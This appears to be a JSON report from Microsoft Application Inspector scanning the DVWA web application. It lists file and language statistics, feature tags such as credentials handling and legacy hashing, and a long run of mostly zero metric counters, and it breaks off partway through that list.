{
  "appVersion": "Microsoft Application Inspector 1.2.6+7599d8f90b",
  "resultCode": 0,
  "metaData": {
    "languages": {
      "php": 357,
      "html": 62,
      "javascript": 10,
      "build.xml": 1,
      "typescript": 1
    },
    "applicationName": "DVWA",
    "sourcePath": "/home/dev/tools/DVWA/",
    "sourceVersion": null,
    "authors": null,
    "description": null,
    "lastUpdated": "4/29/2020 12:14:21 AM",
    "dateScanned": "4/29/2020 1:05:21 AM",
    "filesAnalyzed": 118,
    "totalFiles": 583,
    "filesSkipped": 465,
    "filesAffected": 93,
    "totalMatchesCount": 656,
    "uniqueMatchesCount": 31,
    "packageTypes": [
      "uncompressed"
    ],
    "appTypes": [
      "web.application"
    ],
    "uniqueTags": [
      "Dependency.SourceInclude",
      "Authentication.General",
      "Data.Sensitive.Credentials",
      "Data.DBMS.SQL",
      "Miscellaneous.CodeHygiene.Comment.Suspicious",
      "OS.Network.Connection.Miscellaneous",
      "Metadata.Platform.OS.Linux.Distro",
      "Miscellaneous.OpenSourceLicense.GPL",
      "Metadata.CloudServices.Code.Repo.GitHub",
      "OS.Process.Multiprocessing",
      "Miscellaneous.CodeHygiene.Comment.Fix",
      "Metadata.CloudServices.Code.Repo.SourceForge",
      "Miscellaneous.CodeHygiene.Comment.Todo",
      "Cryptography.HashAlgorithm.Legacy",
      "CloudServices.SocialMedia.Twitter",
      "Authentication.Oauth",
      "Cryptography.Cipher.RSA",
      "Authorization.Permissions",
      "Metadata.Platform.OS.Microsoft.WindowsStandard",
      "CloudServices.SocialMedia.YouTube",
      "Cryptography.HashAlgorithm.SHA2",
      "Cryptography.HashAlgorithm.General",
      "Data.Sensitive.Financial.Currency",
      "Cryptography.Encoding.Base64",
      "Authorization.General",
      "OS.Process.DynamicExecution",
      "Data.Sensitive.Identification",
      "CloudServices.DataStorage.PasteBin",
      "Data.Sensitive.UserAccount",
      "Cryptography.Encryption.General",
      "Cryptography.HashAlgorithm.Misc"
    ],
    "uniqueDependencies": [
      "include",
      "crypto",
      "buffer"
    ],
    "outputs": [],
    "targets": [],
    "OSTargets": [
      "linux",
      "windows"
    ],
    "fileExtensions": [
      "php",
      "ini",
      "txt",
      "md",
      "htaccess",
      "gitignore",
      "ico",
      "html",
      "pdf",
      "dist",
      "css",
      "js",
      "png",
      "jpg",
      "",
      "xml",
      "gif",
      "json",
      "ser",
      "in"
    ],
    "cloudTargets": [
      "github",
      "sourceforge"
    ],
    "CPUTargets": [],
    "tagCounters": [
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 142,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 88,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 11,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 125,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Exception.Caught",
        "count": 2,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Exception.Caught",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
